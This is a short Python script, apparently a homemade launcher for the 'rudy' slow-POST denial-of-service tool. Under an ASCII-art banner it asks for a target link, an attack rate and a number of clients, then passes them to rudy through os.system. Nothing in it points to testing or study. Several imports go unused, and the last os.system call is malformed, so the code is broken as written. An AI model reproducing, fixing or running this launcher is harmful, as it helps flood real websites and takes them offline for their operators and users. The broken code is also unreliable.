from os import link
from tkinter import OFF
import pynput.keyboard 
from pynput.mouse import Button, Controller
import keyboard
import os
import time 
from time import sleep
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys


        ###   ###     ###          ##########      #########
       ###   ###    ########       #########      #########
      ###   ###    ###   ###             ###     ###
     ###   ###    ###    ###           ###      ###
    ##########   ###     ###         ###       ######
   ###   ###    ############       ###        ###
  ###   ###    ###       ###     ###         ###
 ###   ###    ###        ###    ##########  #########
###   ###    ###         ###   ##########  #########



LINK = input("Link:")

SECONDS = input("Attacks per Seconds")

CLIENTS = input("Clients to attack:")

print('rudy -t', LINK, '-d', SECONDS, '-n', CLIENTS, '-v')

os.system("rudy")

os.system('rudy -t', LINK, '-d', SECONDS, '-n', CLIENTS, '-v')

